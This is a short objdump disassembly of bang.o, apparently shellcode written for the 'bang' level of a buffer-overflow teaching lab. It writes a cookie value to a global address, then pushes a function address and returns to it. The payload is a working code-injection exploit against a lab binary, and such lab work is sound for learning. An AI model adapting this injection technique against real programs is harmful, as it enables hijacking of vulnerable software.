
bang.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c6 08 23 60 00 	mov    $0x602308,%rsi
   7:	48 b8 f5 5c 01 19 28 	movabs $0x59c8d52819015cf5,%rax
   e:	d5 c8 59 
  11:	48 89 06             	mov    %rax,(%rsi)
  14:	68 20 10 40 00       	pushq  $0x401020
  19:	c3                   	retq   
